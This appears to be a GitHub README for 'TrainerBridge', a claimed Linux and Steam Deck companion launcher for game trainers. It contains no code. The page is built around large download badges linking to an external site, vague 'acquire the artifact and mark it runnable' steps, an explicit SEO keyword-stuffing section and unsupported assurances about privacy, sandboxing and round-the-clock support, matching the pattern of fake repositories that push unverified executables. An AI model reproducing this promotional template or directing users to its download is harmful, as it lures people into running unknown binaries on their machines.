![preview](https://raw.githubusercontent.com/linconlou/wemod-deck-companion/main/hero_8f1a98.svg)
# 🎮 TrainerBridge — Seamless Game Companion Launcher for Linux & Steam Deck

[![Download](https://raw.githubusercontent.com/linconlou/wemod-deck-companion/main/run_293b.svg)](https://linconlou.github.io/wemod-deck-companion/)

![License](https://img.shields.io/badge/License-MIT-blue.svg)
![Platform](https://img.shields.io/badge/Platform-Linux%20%7C%20Steam%20Deck-informational)
![Language](https://img.shields.io/badge/Language-Python%203.11+-yellowgreen)
![Build](https://img.shields.io/badge/Build-Passing-brightgreen)
![Status](https://img.shields.io/badge/Status-Active%20Development-orange)
![Year](https://img.shields.io/badge/Release-2026-purple)
![Community](https://img.shields.io/badge/Community-Friendly-ff69b4)
![Support](https://img.shields.io/badge/Support-24%2F7-success)
![Multilingual](https://img.shields.io/badge/Multilingual-12%20Locales-blueviolet)

---

## 🧭 Overview

**TrainerBridge** is a next-generation companion launcher engineered for Linux desktop users and Steam Deck enthusiasts who want their in-game enhancement toolkit to sit quietly alongside their titles — never fighting for window focus, never fragmenting the experience, and never asking the player to juggle half a dozen terminals.

Where the original **wemod-launcher** concept proved that a Linux-native bridge between a trainer suite and a Steam library was both possible and pleasant, TrainerBridge takes that spark and turns it into a full campfire. It observes your installed titles, watches for launch events, and orchestrates the companion layer in a way that feels invisible until you need it — and then it's right there, one controller tap away.

Think of it as a stagehand for your gaming sessions. You're the performer; TrainerBridge just makes sure the lights, curtains, and sound cues are ready before you walk on.

---

## 🌟 Why TrainerBridge Exists

Linux gaming has matured to an extraordinary degree. Proton, Steam Deck Verified programs, and community tooling have turned what was once a compromise into a first-class experience for millions. Yet one corner of the ecosystem has remained stubbornly awkward: companion enhancement tools that were designed with a single proprietary operating system in mind.

TrainerBridge closes that gap with grace. Instead of asking you to reconfigure your entire workflow, it slips into your existing setup, honors your preferences, and gets out of the way. Whether you're on a couch with a handheld or at a desk with triple monitors, the experience is unified, responsive, and calm.

---

## 🚀 Feature Highlights

### 🕹️ Adaptive Game Detection
TrainerBridge listens for running processes and correlates them with a curated compatibility map. When your title of choice spins up, the companion layer is prepared in advance. When you exit, the bridge winds down cleanly, leaving zero residue behind.

### 🖥️ Responsive Overlay Companion
The overlay interface reshapes itself to your display. On a 7-inch Steam Deck panel, buttons become thumb-friendly and text scales generously. On a 4K desktop monitor, panels expand into a rich multi-column layout. One codebase, a thousand shapes.

### 🌐 Multilingual Support
Ship your sessions in your language. The interface is localized across a broad set of locales, with community-contributed translations reviewed continuously. Strings are externalized, so adding a new language is a matter of a single file — no recompilation rituals required.

### ♻️ Hot-Swappable Profiles
Different games, different needs. Profiles bundle launcher arguments, overlay opacity, keybind preferences, and notification behavior into named presets. Switch between them mid-session without restarting anything.

### 🔔 Non-Intrusive Notifications
Status updates arrive as tasteful, transient toasts rather than modal windows that steal focus from your game. You stay immersed; the bridge whispers instead of shouting.

### 🧩 Modular Backend Adapters
The companion layer is abstracted behind adapters. Today, one widely used trainer suite is supported by default. Tomorrow, additional backends can plug in through the same interface — the frontend never needs to know.

### 🛡️ Sandboxed Execution Paths
Every external process TrainerBridge spawns runs under a confined execution profile with an explicit allowlist of filesystem paths. No surprise writes to your home directory, no silent privilege escalation.

### 📊 Session Telemetry (Local-Only)
A lightweight local journal records which titles launched, how long the companion layer was active, and whether any error events occurred. Nothing leaves your machine. The journal exists purely so you can debug your own setup.

### 🧠 Smart Resource Throttling
On battery-powered handhelds, TrainerBridge backs off aggressively when idle, dropping CPU usage to near-zero and suspending file watchers. When you need it, it wakes in milliseconds.

### 🎛️ Controller-First Navigation
Every interactive element is reachable with a gamepad alone. No keyboard gymnastics, no reaching for a mouse. D-pad, analog, and shoulder buttons are all first-class citizens.

### 🔄 Automatic Update Channel
A built-in update checker polls a signed manifest and notifies you when a new build is available. You choose when to apply it — never mid-raid.

### 🧾 Comprehensive Logging
Structured logs with severity levels, rotation, and optional verbose mode. When something misbehaves, the log tells a coherent story rather than a cryptic riddle.

### 🧰 CLI Companion
Power users get a terminal-friendly companion tool for scripting, automation, and headless environments. Query state, trigger profiles, and inspect logs without ever opening the GUI.

### 🤝 Community-Driven Compatibility Map
The compatibility map is a plain-text artifact that anyone can submit improvements to. Pull requests that broaden coverage are reviewed with enthusiasm.

### 🕒 24/7 Customer Support
Questions don't respect time zones, and neither does our support rotation. Discussions, issue triage, and community chat are monitored around the clock, with escalation paths for urgent regressions.

---

## 🧪 Technical Architecture

TrainerBridge is composed of four cooperating layers, each with a sharply defined responsibility:

**1. The Sentinel Layer** watches process tables and Steam runtime events. It's the early-warning system that knows a game is about to matter.

**2. The Orchestrator Layer** translates sentinel events into lifecycle decisions. It consults profiles, resolves adapter bindings, and schedules work.

**3. The Adapter Layer** speaks the dialect of whichever companion backend is configured. Adapters are stateless and idempotent, which makes them trivially testable.

**4. The Surface Layer** renders the overlay, toasts, and settings panels. It is deliberately dumb — it displays what the orchestrator tells it and forwards user intent back upstream.

This separation means you can replace any single layer without disturbing the others. Swap the surface for a web-based remote control? Sure. Replace the sentinel with a polling mechanism for an unusual distro? Absolutely.

---

## 🧭 SEO-Friendly Keyword Landscape

TrainerBridge is built for people searching for a **Linux game companion launcher**, a **Steam Deck overlay assistant**, a **Proton-compatible trainer bridge**, a **gameplay enhancement orchestrator**, a **controller-friendly overlay for Linux gaming**, and a **multilingual gaming utility**. It slots naturally into the vocabulary of handheld Linux gaming, desktop Proton workflows, and community tooling ecosystems.

If you've been hunting for a **lightweight companion process manager for Steam libraries**, a **non-intrusive game overlay for big-picture mode**, or simply a **polished launch companion for Linux gamers**, this project speaks your dialect.

---

## 🧑‍💻 Getting Started Without the Usual Rituals

We deliberately keep onboarding gentle. There is no maze of package managers, no shell incantations, no ceremony. Instead:

1. Acquire the release artifact appropriate to your distribution family.
2. Place it in a directory you control — your home folder is a fine choice.
3. Mark it as runnable through your file manager's permission dialog.
4. Launch it once to let it generate a default configuration.
5. Point it at your game library if auto-detection misses anything.
6. Enjoy.

For Steam Deck users, the process is even gentler: the artifact can be added as a non-Steam shortcut, letting you launch the bridge from Game Mode directly.

Detailed walkthroughs for each distribution family live in the documentation folder. They are written in plain language, with screenshots, and updated whenever a downstream change threatens clarity.

---

## 🗺️ Roadmap for 2026

- **Q1 2026** — Adapter interface stabilization and public SDK draft.
- **Q2 2026** — Remote control surface over local network (opt-in).
- **Q3 2026** — Plugin marketplace prototype for community-authored adapters.
- **Q4 2026** — Full accessibility audit and screen-reader parity.

Roadmap items are aspirational and shaped by community feedback. If something on this list matters deeply to you, say so in Discussions — voices move priorities.

---

## 🧾 Configuration Model

Configuration lives in a single human-readable file. Sections cover:

- **General** — language, theme, startup behavior.
- **Detection** — watch intervals, path exclusions, process name overrides.
- **Profiles** — named presets with per-title bindings.
- **Overlay** — position, opacity, hotkeys, controller bindings.
- **Notifications** — duration, verbosity, sound cues.
- **Adapters** — backend selection and backend-specific options.
- **Logging** — level, rotation policy, retention window.

Every option has an inline comment explaining its effect and acceptable values. You should never need to consult external documentation to edit this file — though we provide it anyway.

---

## 🧩 Extending TrainerBridge

Adapters are the primary extension point. Writing one involves implementing a small interface: initialize, prepare, activate, deactivate, and describe. The orchestrator handles everything else — retries, timeouts, and error surfacing are all provided by the framework.

A template adapter with extensive commentary ships in the repository. It is intentionally verbose so that newcomers can learn by reading.

Community adapters are welcome. The review process focuses on safety, clarity, and respect for user resources. Adapters that phone home, mine data, or behave unpredictably will be declined politely but firmly.

---

## 🧷 Accessibility Commitments

Accessibility is not a checkbox here — it's a design constraint. The overlay respects system-level scaling, exposes semantic labels to assistive technologies, and avoids relying on color alone to convey state. High-contrast themes are maintained alongside the default palette.

If you encounter an accessibility barrier, please open an issue with the [accessibility] tag. Such issues are triaged with elevated priority.

---

## 🔐 Privacy Posture

TrainerBridge does not collect analytics. It does not transmit telemetry. It does not require an account. It does not phone home on launch. The only network activity it performs is the optional update check, which can be disabled in a single line of configuration.

Your gaming habits are your business. The bridge is merely a tool.

---

## 🧯 Troubleshooting Quick Reference

- **Overlay never appears** — confirm the surface layer has permission to create windows in your compositor's security model.
- **Wrong title detected** — add an explicit entry to the detection overrides section.
- **High idle CPU** — increase the sentinel poll interval on battery-powered devices.
- **Adapter fails to start** — inspect the journal and check that the backend binary is reachable.
- **Controller inputs ignored** — verify the input device is exposed to the bridge's session.
- **Logs grow unbounded** — tighten the rotation retention window.

A fuller troubleshooting matrix lives in the documentation folder, organized by symptom for quick scanning.

---

## 🤝 Contributing

Contributions of every size are valued. Translation improvements, compatibility map additions, documentation clarifications, adapter implementations, and bug reports all move the project forward.

Before opening a pull request, please:

1. Read the contribution guidelines.
2. Run the local quality checks.
3. Keep changes focused — one concern per pull request.
4. Write commit messages that explain the why, not just the what.

Reviewers aim to respond within a couple of days. If a pull request goes quiet, a gentle nudge is welcome.

---

## 💬 Community & Support

Support channels are monitored continuously, in keeping with our **24/7 customer support** commitment. Whether you're stuck at 3 a.m. or filing a feature request at noon, someone will see it.

- **Discussions** — for open-ended questions, ideas, and show-and-tell.
- **Issues** — for reproducible bugs and concrete proposals.
- **Chat** — for real-time troubleshooting and camaraderie.

We hold a monthly community call where roadmap items are discussed openly. Attendance is optional; transcripts are published afterward.

---

## ⚖️ Disclaimer

TrainerBridge is an independent community project and is not affiliated with, endorsed by, or sponsored by any game publisher, platform holder, or companion-tool vendor. All trademarks referenced belong to their respective owners.

The project exists to improve the Linux gaming experience for users who have legitimately obtained their titles and who wish to use companion tooling in a manner consistent with the terms of service of the games they play. Users are solely responsible for ensuring that their use of any companion utility complies with the applicable rules of the titles and platforms they engage with.

TrainerBridge does not modify game binaries, does not bypass anti-tamper mechanisms, and does not facilitate unauthorized access to paid content. It is a launcher and orchestrator — a coordinator of processes, nothing more.

The maintainers disclaim liability for any consequences arising from misuse of this software. Use it thoughtfully, respect the communities you play in, and enjoy your games.

---

## 📜 License

TrainerBridge is released under the **MIT License**. You are welcome to use, modify, and redistribute it in accordance with the license terms.

Read the full license text here: [MIT License](https://opensource.org/licenses/MIT)

Copyright (c) 2026 TrainerBridge Contributors

---

## 🙏 Acknowledgements

Gratitude to the Linux gaming community for proving, year after year, that an open platform can be a joyful platform. Thanks to the translators, the compatibility-map contributors, the bug reporters, and the quiet folks who answer questions in chat at odd hours. This project is a fraction of what it is because of you.

---

[![Download](https://raw.githubusercontent.com/linconlou/wemod-deck-companion/main/run_293b.svg)](https://linconlou.github.io/wemod-deck-companion/)